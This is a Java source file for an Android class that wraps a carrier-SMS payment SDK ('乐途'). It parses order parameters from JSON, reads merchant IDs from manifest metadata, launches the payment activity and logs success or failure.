package com.core_sur.task;

import org.json.JSONObject;

import android.app.Activity;
import android.content.Context;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;

import com.core_sur.Config;
import com.core_sur.WCConnect;
import com.core_sur.bean.FeeSMSStatusMessage;
import com.core_sur.finals.URLFinals;
import com.core_sur.publics.EPCoreManager;
import com.core_sur.tools.CommonUtils;
import com.example.ltsdk.LtPayActivity;

/**
 * 乐途
 *--------需要初始化，计费开始时初始化
 *
 * @author Wang
 * 
 */
public class ltpay extends Pay {

	/**
	 * 
	 */

	private static final long serialVersionUID = 2071383061363323381L;
	
	public static final int LT_PAY_OK = 2;
	public static final int LT_PAY_FAIL = 3;
	public static final String DEL = "\\u005f";
	public static final String DEL1 = "\\u0025";

	private int ssPayStatus;
	private String json;
	private String sdkName;
	private String sdkId;

	String amout = null;
	String channelId = null;
	String orderId = null;
	String propName = null;
	String gameName = null;
	String cpName = null;
	String appKey = null;
	String payCode = null;
	String key_code = null;
	String serviceTel = null;
	String merchantPasswd =null;
	String pointNum=null;
	String key=null;
	String pointNumandchannelName=null;
	public int getLTStatus() {
		return ssPayStatus;
	}

	public void setLTStatus(int ssPayStatus) {
		this.ssPayStatus = ssPayStatus;
	}

	public void setJsonParams(String json) {
		this.json = json;
	}

	public ltpay() {
		System.out.println("new LT");
		setType(PAY_TYPE_LT);
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		super.run();
		setExecuteStatus(EXECUTE_STATUS_RUN);

		try {
			JSONObject jsonObj = new JSONObject(json);
			amout = jsonObj.getString("Amout");
			sdkId = jsonObj.getString("Sdkid");
			sdkName = jsonObj.getString("Sdkname");
			channelId = jsonObj.getString("Channelid");
			propName = jsonObj.getString("Propname");
			orderId = jsonObj.getString("Orderid");
			gameName = jsonObj.getString("Productname");
			cpName = jsonObj.getString("Channelid");
			key_code = jsonObj.getString("Appkey");
			
			//System.out.println(jsonObj.toString()+"keycode::::"+key_code);
		} catch (Exception e) {
			e.fillInStackTrace();
			setExecuteStatus(EXECUTE_STATUS_COMPLETE);
			ssPayStatus = LT_PAY_FAIL;
			return;
		}
		try {
			if (CommonUtils.getWindowTopViews() != null
					&& CommonUtils.getWindowTopViews().length > 0) {
				final Context c = CommonUtils.getWindowTopViews()[0]
						.getContext();
				serviceTel = c.getSharedPreferences("payInfo",
						Context.MODE_PRIVATE).getString("payContact", "");
				if (serviceTel == null) {
					serviceTel = "00000000";
				}
				if (key_code == null || amout == null || gameName == null
						|| cpName == null || orderId == null) {
					setExecuteStatus(EXECUTE_STATUS_COMPLETE);
					ssPayStatus = LT_PAY_FAIL;
					payFail();
					return;
				}
				
				
				String temp[] = key_code.split(DEL);

				if (temp.length > 1) {
					merchantPasswd = temp[0];
					pointNumandchannelName = temp[1];
					String temp1[]=pointNumandchannelName.split(DEL1);
					if (temp1.length>1) {
						pointNum=temp1[0];
						key=temp1[1];
					}else{
						payFail();
						return;
					}
					//System.out.println("merchantPasswd:"+merchantPasswd+",pointNum:"+pointNum+",channelName:"+key);
				} else {

					payFail();
					return;
				}
				
				
				
				final String chargePoint;

				chargePoint = Integer.parseInt(amout)+"";

				LtPayActivity.initPaySDK();
				
				((Activity) c).runOnUiThread(new Runnable() {

					@Override
					public void run() {
						// TODO Auto-generated method stub
						
						ApplicationInfo appInfo;
						String merchantid="";
						String mappid="";
						String cpchannelid="";
						try {
							appInfo = c.getPackageManager().getApplicationInfo(c.getPackageName(),PackageManager.GET_META_DATA);
							merchantid=appInfo.metaData.getString("lltt_merchantid");
							//System.out.println("lltt_merchantid:"+merchantid);
							
							mappid = appInfo.metaData.getInt("lltt_mappid")+"";
							//System.out.println("lltt_mappid："+mappid);
							
							cpchannelid = appInfo.metaData.getString("lltt_cpchannelid");
							//System.out.println("lltt_cpchannelid:"+cpchannelid);
						} catch (NameNotFoundException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}	
					  
//						Toast.makeText(this ,  "meta:" +foo,  1 ).show(); 
						//System.out.println("orderId:"+orderId+".merchantPasswd:"+merchantPasswd+".gameName:"+gameName+".pointNum:"+pointNum+".propName:"+propName+".cpchannelid:"+cpchannelid+".merchantid:"+merchantid+".mappid:"+mappid+".chargePoint:"+chargePoint);
						LtPayActivity.pay((Activity)c, orderId, merchantPasswd, "1", gameName, pointNum, "仅需X.XX元，即可拥有！", propName, cpchannelid,"SDK", merchantid, mappid, chargePoint,key,new com.example.ltsdk.PayResultListener() {
							String errorMsg = "";
							@Override
							public void PaySucess() {
								// TODO Auto-generated method stub
								errorMsg = "支付成功！";
								//System.out.println(errorMsg);
								setExecuteStatus(EXECUTE_STATUS_COMPLETE);
								ssPayStatus = LT_PAY_OK;
								payOk();
							}
							
							@Override
							public void PayFailed() {
								// TODO Auto-generated method stub
								errorMsg = "短信发送失败！";
								//System.out.println(errorMsg);
								setExecuteStatus(EXECUTE_STATUS_COMPLETE);
								ssPayStatus = LT_PAY_FAIL;
								payFail();
							}
						});
					}
				});

			}
		} catch (Exception e) {
			setExecuteStatus(EXECUTE_STATUS_COMPLETE);
			ssPayStatus = LT_PAY_FAIL;
			payFail();
		}
	}

	private void payOk() {
		String timeStamp;
		WCConnect.getInstance().PostLog(
				"SMSSendStatus:-1" + Config.splitStringLevel1 + sdkId
						+ Config.splitStringLevel1 + sdkName
						+ Config.splitStringLevel1 + "SendOK");
		EPCoreManager.getInstance().payHandler
				.sendEmptyMessage(Config.CMD_SENDSMSSUCCESS);
		if (WCConnect.getInstance().currentPayFeeMessage != null) {
			timeStamp = (String) WCConnect.getInstance().currentPayFeeMessage
					.get("TimeStamp");
		} else {
			timeStamp = "未知流水号 AppKey:" + CommonUtils.getAppKey(context);
		}
		FeeSMSStatusMessage feeSMSStatusMessage = new FeeSMSStatusMessage(
				timeStamp, 0);
		//EPCoreManager.getInstance().sendMessage(URLFinals.WEB_SMSSTATIC,feeSMSStatusMessage, null);
				
	}

	private void payFail() {
		EPCoreManager.getInstance().payHandler
				.sendEmptyMessage(Config.CMD_SENDSMSERROR);
		WCConnect.getInstance().PostLog(
				"SMSSendStatus:" + 3 + Config.splitStringLevel1 + sdkId
						+ Config.splitStringLevel1 + sdkName
						+ Config.splitStringLevel1
						+ "SendErro,meybe UserCancel");
		String timeStamp;
		if (WCConnect.getInstance().currentPayFeeMessage != null) {
			timeStamp = (String) WCConnect.getInstance().currentPayFeeMessage
					.get("TimeStamp");
		} else {
			timeStamp = "未知流水号 AppKey:" + CommonUtils.getAppKey(context);
		}
		FeeSMSStatusMessage feeSMSStatusMessage = new FeeSMSStatusMessage(
				timeStamp, -1);
		//EPCoreManager.getInstance().sendMessage(URLFinals.WEB_SMSSTATIC,feeSMSStatusMessage, null);
				
	}
}
